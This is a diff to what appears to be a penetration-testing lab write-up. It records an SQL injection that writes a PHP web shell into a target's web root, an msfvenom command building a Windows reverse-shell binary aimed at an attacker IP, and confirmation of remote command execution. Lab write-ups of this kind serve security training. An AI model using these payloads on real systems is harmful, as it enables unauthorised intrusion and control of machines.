@@ -450,6 +450,30 @@ Enumerated top 200 UDP ports:
 
 #### - Found mysql on the page so I typed one quote and clicked request to confirm if it might be vulernable to sql injection:
 
+![](Pasted%20image%2020221020191855.png)
+
+![](Pasted%20image%2020221020191917.png)
+
+#### - Received an error showing it was vulnerable and has sql database running:
+
+![](Pasted%20image%2020221020192000.png)
+#sqlinjection 
+
+#### -As we confirmed previously the root directory of the target machine is "C:/xampp/htdocs" I typed ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -' and request 
+#phpcodeExecutionCommand
+
+#### - Received no error
+
+#### - Created a reverse shell binary on my kali machine by typing "msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=192.168.49.114 LPORT=8000"
+
+![](Pasted%20image%2020221020192215.png)
+
+
+
+
+
+#### - Navigated to "192.168.114.127:45332/cmd.php?cmd=whoami" and confirmed we have remote code execution on the target machine
+
 ---
 
 # Lateral Movement to user
